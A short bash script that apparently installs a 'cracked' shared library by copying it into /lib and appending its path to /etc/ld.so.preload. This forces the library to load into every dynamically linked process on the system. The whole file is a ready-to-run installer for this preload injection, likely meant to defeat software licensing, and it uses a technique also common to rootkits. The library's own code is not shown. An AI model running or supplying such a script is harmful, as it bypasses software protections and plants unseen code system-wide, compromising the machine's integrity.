#!/bin/bash
rm -f /lib/rt_cracked.so
cp cracked.so /lib/rt_cracked.so
if [[ ! -f /etc/ld.so.preload ]]; then
    touch /etc/ld.so.preload
fi
echo "/lib/rt_cracked.so" >> /etc/ld.so.preload